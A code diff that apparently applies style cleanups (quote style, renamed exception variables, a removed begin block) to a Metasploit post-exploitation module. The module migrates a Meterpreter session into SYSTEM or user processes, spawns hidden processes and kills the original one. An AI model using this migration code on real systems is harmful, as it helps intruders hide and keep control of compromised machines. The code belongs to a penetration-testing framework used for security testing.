@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Post
     print_status("Current session process is #{@original_name} (#{@original_pid}) as: #{client.sys.config.getuid}")
     unless migrate_admin
       if is_admin? && !datastore['NOFAIL']
-        print_status("NOFAIL set to false, exiting module.")
+        print_status('NOFAIL set to false, exiting module.')
         return
       end
       migrate_user
@@ -79,7 +79,7 @@ class MetasploitModule < Msf::Post
   def get_pid(proc_name)
     processes = client.sys.process.get_processes
     processes.each do |proc|
-      if proc['name'].downcase == proc_name && proc['user'] != ""
+      if proc['name'].downcase == proc_name && proc['user'] != ''
         return proc['pid']
       end
     end
@@ -95,9 +95,9 @@ class MetasploitModule < Msf::Post
         print_status("Trying to kill original process #{proc_name} (#{proc_pid})")
         session.sys.process.kill(proc_pid)
         print_good("Successfully killed process #{proc_name} (#{proc_pid})")
-      rescue ::Rex::Post::Meterpreter::RequestError => error
+      rescue ::Rex::Post::Meterpreter::RequestError => e
         print_error("Could not kill original process #{proc_name} (#{proc_pid})")
-        print_error(error.to_s)
+        print_error(e.to_s)
       end
     end
   end
@@ -123,13 +123,13 @@ class MetasploitModule < Msf::Post
       client.core.migrate(target_pid)
       print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
       return true
-    rescue ::Rex::Post::Meterpreter::RequestError => req_error
+    rescue ::Rex::Post::Meterpreter::RequestError => e
       print_error("Could not migrate to #{proc_name}.")
-      print_error(req_error.to_s)
+      print_error(e.to_s)
       return false
-    rescue ::Rex::RuntimeError => run_error
+    rescue ::Rex::RuntimeError => e
       print_error("Could not migrate to #{proc_name}.")
-      print_error(run_error.to_s)
+      print_error(e.to_s)
       return false
     end
   end
@@ -146,15 +146,15 @@ class MetasploitModule < Msf::Post
       admin_targets.map!(&:downcase)
 
       if is_system?
-        print_status("Session is already Admin and System.")
+        print_status('Session is already Admin and System.')
         if admin_targets.include? @original_name
           print_good("Session is already in target process: #{@original_name}.")
           return true
         end
       else
-        print_status("Session is Admin but not System.")
+        print_status('Session is Admin but not System.')
       end
-      print_status("Will attempt to migrate to specified System level process.")
+      print_status('Will attempt to migrate to specified System level process.')
 
       # Try to migrate to each of the System level processes in the list.  Stop when one works.  Go to User level migration if none work.
       admin_targets.each do |target_name|
@@ -163,9 +163,9 @@ class MetasploitModule < Msf::Post
           return true
         end
       end
-      print_error("Unable to migrate to any of the System level processes.")
+      print_error('Unable to migrate to any of the System level processes.')
     else
-      print_status("Session has User level rights.")
+      print_status('Session has User level rights.')
     end
     false
   end
@@ -180,7 +180,7 @@ class MetasploitModule < Msf::Post
     user_targets.unshift(datastore['NAME']) if datastore['NAME']
     user_targets.map!(&:downcase)
 
-    print_status("Will attempt to migrate to a User level process.")
+    print_status('Will attempt to migrate to a User level process.')
 
     # Try to migrate to user level processes in the list.  If it does not exist or cannot migrate, try spawning it then migrating.
     user_targets.each do |target_name|
@@ -202,15 +202,13 @@ class MetasploitModule < Msf::Post
   # @return [Integer] the PID if the process spawned successfully
   # @return [NilClass] if the spawn failed
   def spawn(proc_name)
-    begin
-      print_status("Attempting to spawn #{proc_name}")
-      proc = session.sys.process.execute(proc_name, nil, { 'Hidden' => true })
-      print_good("Successfully spawned #{proc_name}")
-      return proc.pid
-    rescue ::Rex::Post::Meterpreter::RequestError => error
-      print_error("Could not spawn #{proc_name}.")
-      print_error(error.to_s)
-      return nil
-    end
+    print_status("Attempting to spawn #{proc_name}")
+    proc = session.sys.process.execute(proc_name, nil, { 'Hidden' => true })
+    print_good("Successfully spawned #{proc_name}")
+    return proc.pid
+  rescue ::Rex::Post::Meterpreter::RequestError => e
+    print_error("Could not spawn #{proc_name}.")
+    print_error(e.to_s)
+    return nil
   end
 end
